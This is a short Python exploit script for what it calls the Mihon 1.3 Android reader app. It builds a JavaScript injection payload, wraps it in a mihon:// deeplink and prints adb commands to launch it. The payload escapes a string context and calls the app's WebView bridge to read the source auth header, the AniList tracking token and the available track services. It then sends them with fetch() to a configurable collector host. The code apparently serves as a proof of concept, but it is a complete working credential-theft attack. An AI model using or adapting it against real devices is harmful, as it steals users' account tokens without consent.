from argparse import ArgumentParser
from urllib.parse import quote, urlencode


DEFAULT_OFFICIAL_URL = "https://mihon.app/help/reader-notice"


def build_payload(collector_url):
    collect = collector_url.rstrip("/") + "/collect?d="
    js = (
        "');"
        "(function(){"
        "fetch('" + collect + "'+encodeURIComponent("
        "'source='+window.mihonAndroidBridge.getSourceAuthHeader()"
        "+'&anilist='+window.mihonAndroidBridge.getTrackToken('anilist')"
        "+'&services='+window.mihonAndroidBridge.getAvailableTrackServices()"
        "));"
        "})();"
        "//"
    )
    return js


def build_deeplink(official_url, payload):
    query = urlencode(
        {
            "url": official_url,
            "notice": payload,
        },
        quote_via=quote,
    )
    return "mihon://help/webview?" + query


def parse_args():
    parser = ArgumentParser(description="Generate the Mihon 1.3 script-injection deeplink.")
    parser.add_argument(
        "--collector",
        default="http://10.0.2.2:8000",
        help="Collector origin visible to the Android device, for example http://10.0.2.2:8000",
    )
    parser.add_argument(
        "--official-url",
        default=DEFAULT_OFFICIAL_URL,
        help="Official reader notice URL loaded by the vulnerable WebView.",
    )
    return parser.parse_args()


def main():
    args = parse_args()
    payload = build_payload(args.collector)
    deeplink = build_deeplink(args.official_url, payload)
    adb_command = "adb shell \"am start -a android.intent.action.VIEW -d '" + deeplink + "'\""

    print("payload:")
    print(payload)
    print()
    print("deeplink:")
    print(deeplink)
    print()
    print("adb:")
    print(adb_command)
    print()
    print("powershell direct:")
    print("adb shell am start -a android.intent.action.VIEW -d '" + deeplink.replace("&", "\\&") + "'")


if __name__ == "__main__":
    main()
